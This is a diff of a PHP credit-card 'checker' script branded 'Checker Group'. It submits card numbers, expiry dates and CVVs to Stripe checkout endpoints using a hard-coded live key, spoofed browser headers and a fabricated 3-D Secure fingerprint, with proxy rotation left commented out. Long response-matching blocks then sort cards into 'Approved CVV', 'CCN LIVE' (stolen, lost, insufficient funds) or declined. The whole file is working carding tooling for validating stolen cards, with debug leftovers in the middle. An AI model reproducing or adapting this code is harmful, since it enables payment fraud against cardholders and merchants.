@@ -43,6 +43,20 @@ function GetStr($string, $start, $end) {
     $str = explode($end, $str[1]);  
     return $str[0];
 }
+
+function GetObj($obj, $src,$findIn=null) {
+  $array = json_decode($obj,true);
+  foreach ($array as $key => $value){
+    if($key == $src){
+      if($findIn != null){
+        return $value[$findIn];
+      }
+      return $value;
+    }
+  }
+  return null;
+}
+
 function inStr($string, $start, $end, $value) {
     $str = explode($start, $string);
     $str = explode($end, $str[$value]);
@@ -54,14 +68,14 @@ $mes = $separa[1];
 $ano = $separa[2];
 $cvv = $separa[3];
 
-function rebootproxys()
-{
-  $poxySocks = file("proxy.txt");
-  $myproxy = rand(0, sizeof($poxySocks) - 1);
-  $poxySocks = $poxySocks[$myproxy];
-  return $poxySocks;
-}
-$poxySocks4 = rebootproxys();
+// function rebootproxys()
+// {
+//   $poxySocks = file("proxy.txt");
+//   $myproxy = rand(0, sizeof($poxySocks) - 1);
+//   $poxySocks = $poxySocks[$myproxy];
+//   return $poxySocks;
+// }
+// $poxySocks4 = rebootproxys();
 
 $number1 = substr($ccn,0,4);
 $number2 = substr($ccn,4,4);
@@ -170,7 +184,7 @@ $sessionId = getSID();
 
 $ch = curl_init();
 // curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
-curl_setopt($ch, CURLOPT_URL, 'https://checkout.stripe.com/c/pay/'.$sessionId.'#fidkdWxOYHwnPyd1blppbHNgWnJCdkRWazFvYlFhUXdUVjRAZ2JKfz1MTzU1XW5uZ0FpR0wnKSdobGF2Jz9%2BJ2JwbGEnPyc9MGM0MWA2MSg3NDc9KDEwPDEoPGE0YCg2M2ZhNWAzNGRhYzY1NWNnYzEnKSdocGxhJz8nMzw8Nmc3M2EoNzc8MygxNT03KD1hZzQoMGZnMjYxPWA2NTU9MzxhNzM1JykndmxhJz8nM2MzMDI8ZzIoNWA1ZCgxZGQzKDw8NmQoYzFjYTM0MzZkM2FgYGY2Z2c1J3gpJ2dgcWR2Jz9eWCknaWR8anBxUXx1YCc%2FJ3Zsa2JpYFpscWBoJyknd2BjYHd3YHdKd2xibGsnPydtcXF1dj8qKmJ3ZGR2dStgcCd4JSUl');
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
@@ -179,14 +193,14 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'path: /v1/payment_methods',
 'scheme: https',
 'accept: application/json',
-'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
+'accept-language: en-US,en;q=0.9,fr-FR;q=0.8,fr;q=0.7,ar;q=0.6',
 'content-type: application/x-www-form-urlencoded',
-'origin: https://js.stripe.com',
-'referer: https://js.stripe.com/',
+'origin: https://checkout.stripe.com',
+'referer: https://checkout.stripe.com/',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-site',
-'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
+'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
 ));
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
@@ -197,7 +211,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, '#');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[name]='.$firstname.'+'.$lastname.'&billing_details[email]='.$email.'&billing_details[address][country]=US&billing_details[address][postal_code]='.$zip.'&guid=7a6b7ade-2de2-4cd4-93ac-19431defb5c93b4558&muid=0d41bab3-09bc-41c9-896b-aa48b89d2ec389148f&sid=8cbb7e96-7cc5-48c2-a87d-4b634e7ceaac194b1f&key=pk_live_wGsASn4jgTdTrQS1EbgOz8IJ00XkkbDlBI&payment_user_agent=stripe.js%2F185ad2604%3B+stripe-js-v3%2F185ad2604%3B+checkout');
 
 
 
@@ -207,8 +221,8 @@ $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 # -------------------- [2 REQ] -------------------#
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
-curl_setopt($ch, CURLOPT_URL, '#');
+// curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$sessionId.'/confirm');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -218,17 +232,16 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'authority: ',
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'authority: api.stripe.com',
 'method: POST',
-'path: ',
+'path: /v1/payment_pages/'.$sessionId.'/confirm',
 'scheme: https',
 'accept: application/json, text/plain, */*',
 'accept-language: en-US,en;q=0.9',
-'content-type: application/json;charset=UTF-8',
-'cookie: ',
-'origin: ',
-'referer: ',
+'content-type: application/x-www-form-urlencoded',
+'origin: https://checkout.stripe.com',
+'referer: https://checkout.stripe.com',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-origin',
@@ -237,17 +250,27 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'#');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'eid=NA&payment_method='.$id.'&expected_amount=100&last_displayed_line_item_group_details[subtotal]=100&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key=pk_live_wGsASn4jgTdTrQS1EbgOz8IJ00XkkbDlBI');
 
 $result2 = curl_exec($ch);
-$token = trim(strip_tags(getStr($result2,'"id": "','"')));
+// $id2 = getObj($result2,'payment_intent','id');
+$source = trim(strip_tags(getStr($result2,'"three_d_secure_2_source": "','"')));
+// $client_secret = trim(strip_tags(getStr($result2,'"client_secret": "','"')));
+
+echo '<br> source';
+echo $source;
+var_dump($source);
 
 
+
+
+
+die();
 # -------------------- [3 REQ] -------------------#
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
-curl_setopt($ch, CURLOPT_URL, '#');
+// curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/3ds2/authenticate');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -258,16 +281,15 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'authority: ',
+'authority: api.stripe.com',
 'method: POST',
-'path: ',
+'path: /v1/3ds2/authenticate',
 'scheme: https',
 'accept: application/json, text/plain, */*',
 'accept-language: en-US,en;q=0.9',
-'content-type: application/json;charset=UTF-8',
-'cookie: ',
-'origin: ',
-'referer: ',
+'content-type: application/x-www-form-urlencoded',
+'origin: https://js.stripe.com',
+'referer: https://js.stripe.com',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-origin',
@@ -276,9 +298,47 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [3req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'#');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'source='.$source.'&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22fr-FR%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22768%22%2C%22browserScreenWidth%22%3A%221366%22%2C%22browserTZ%22%3A%22-60%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F107.0.0.0+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=true&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key=pk_live_wGsASn4jgTdTrQS1EbgOz8IJ00XkkbDlBI');
 
 $result3 = curl_exec($ch);
+
+# ---------------------------------------#
+
+# -------------------- [4 REQ] -------------------#
+
+$ch = curl_init();
+// curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$id2.'?key=pk_live_wGsASn4jgTdTrQS1EbgOz8IJ00XkkbDlBI&is_stripe_sdk=false&client_secret='.$client_secret);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'authority: api.stripe.com',
+'method: GET',
+'path: /v1/payment_intents/'.$id2.'?key=pk_live_wGsASn4jgTdTrQS1EbgOz8IJ00XkkbDlBI&is_stripe_sdk=false&client_secret='.$client_secret,
+'scheme: https',
+'accept: application/json, text/plain, */*',
+'accept-language: en-US,en;q=0.9',
+'content-type: application/x-www-form-urlencoded',
+'origin: https://js.stripe.com',
+'referer: https://js.stripe.com',
+'sec-fetch-dest: empty',
+'sec-fetch-mode: cors',
+'sec-fetch-site: same-origin',
+'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36',
+   ));
+
+# ----------------- [4req Postfields] ---------------------#
+
+// curl_setopt($ch, CURLOPT_POSTFIELDS,'source='.$source.'&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22fr-FR%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22768%22%2C%22browserScreenWidth%22%3A%221366%22%2C%22browserTZ%22%3A%22-60%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F107.0.0.0+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=true&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key=pk_live_wGsASn4jgTdTrQS1EbgOz8IJ00XkkbDlBI');
+
+$result4 = curl_exec($ch);
 
 # ---------------------------------------#
 
@@ -310,318 +370,318 @@ if(strpos($fim, '"type":"credit"') !== false) {
 # ---------------- [Responses] ----------------- #
 
 if
-(strpos($result3,  '"cvc_check": "pass"')) {
+(strpos($result4,  '"cvc_check": "pass"')) {
   echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  "Thank You For Donation.")) {
+(strpos($result4,  "Thank You For Donation.")) {
   echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 elseif
-(strpos($result3,  '"Thank You For Donation."')) {
-  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
-}
-
-elseif
-(strpos($result3,  "Thank You.")) {
+(strpos($result4,  '"Thank You For Donation."')) {
   echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  'Your card zip code is incorrect.')) {
+(strpos($result4,  "Thank You.")) {
+  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
+}
+
+elseif
+(strpos($result4,  'Your card zip code is incorrect.')) {
   echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 } 
 elseif
-(strpos($result3,  '/donations/thank_you?donation_number=','')) {
+(strpos($result4,  '/donations/thank_you?donation_number=','')) {
   echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 
 elseif
-(strpos($result3,  "incorrect_zip")) {
+(strpos($result4,  "incorrect_zip")) {
   echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED Incorrect zip  [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 
 elseif
-(strpos($result3,  '"type":"one-time"')) {
+(strpos($result4,  '"type":"one-time"')) {
   echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED Incorrect zip  [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  'security code is incorrect.')) {
+(strpos($result4,  'security code is incorrect.')) {
   echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  'security code is invalid.')) {
+(strpos($result4,  'security code is invalid.')) {
   echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  'Your card&#039;s security code is incorrect.')) {
+(strpos($result4,  'Your card&#039;s security code is incorrect.')) {
   echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  "incorrect_cvc")) {
+(strpos($result4,  "incorrect_cvc")) {
   echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  "stolen_card")) {
+(strpos($result4,  "stolen_card")) {
   echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Stolen_Card [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  "lost_card")) {
+(strpos($result4,  "lost_card")) {
   echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>lost_card [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  'Your card has insufficient funds.')) {
+(strpos($result4,  'Your card has insufficient funds.')) {
   echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>insufficient funds [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  "pickup_card")) {
+(strpos($result4,  "pickup_card")) {
   echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Pickup Card_Card [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  "insufficient_funds")) {
+(strpos($result4,  "insufficient_funds")) {
   echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>insufficient_funds [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  '"cvc_check": "fail"')) {
+(strpos($result4,  '"cvc_check": "fail"')) {
   echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  'security code is invalid.')) {
+(strpos($result4,  'security code is invalid.')) {
   echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  'Your card&#039;s security code is incorrect.')) {
+(strpos($result4,  'Your card&#039;s security code is incorrect.')) {
   echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  "incorrect_cvc")) {
+(strpos($result4,  "incorrect_cvc")) {
   echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  "stolen_card")) {
+(strpos($result4,  "stolen_card")) {
   echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Stolen_Card [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  "lost_card")) {
+(strpos($result4,  "lost_card")) {
   echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>lost_card [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  'Your card has insufficient funds.')) {
+(strpos($result4,  'Your card has insufficient funds.')) {
   echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>insufficient funds [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  "pickup_card")) {
+(strpos($result4,  "pickup_card")) {
   echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Pickup Card_Card [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  "insufficient_funds")) {
+(strpos($result4,  "insufficient_funds")) {
   echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>insufficient_funds [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  'Your card has expired.')) {
+(strpos($result4,  'Your card has expired.')) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Expired [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  'Your card number is incorrect.')) {
+(strpos($result4,  'Your card number is incorrect.')) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  "incorrect_number")) {
+(strpos($result4,  "incorrect_number")) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 
 elseif
-(strpos($result3,  'card was declined.')) {
+(strpos($result4,  'card was declined.')) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Declined [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  "generic_decline")) {
+(strpos($result4,  "generic_decline")) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Generic_Decline [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  "do_not_honor")) {
+(strpos($result4,  "do_not_honor")) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Do_Not_Honor [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 
 elseif
-(strpos($result3,  "expired_card")) {
+(strpos($result4,  "expired_card")) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Expired Card [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  'Your card does not support this type of purchase.')) {
+(strpos($result4,  'Your card does not support this type of purchase.')) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support This Purchase [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  "processing_error")) {
+(strpos($result4,  "processing_error")) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>processing_error [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3, "service_not_allowed")) {
+(strpos($result4, "service_not_allowed")) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Service Not Allowed [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  '"cvc_check": "unchecked"')) {
+(strpos($result4,  '"cvc_check": "unchecked"')) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVC Check Unavailable [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  '"cvc_check": "unavailable"')) {
+(strpos($result4,  '"cvc_check": "unavailable"')) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVC Check Unavailable [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  "parameter_invalid_empty")) {
+(strpos($result4,  "parameter_invalid_empty")) {
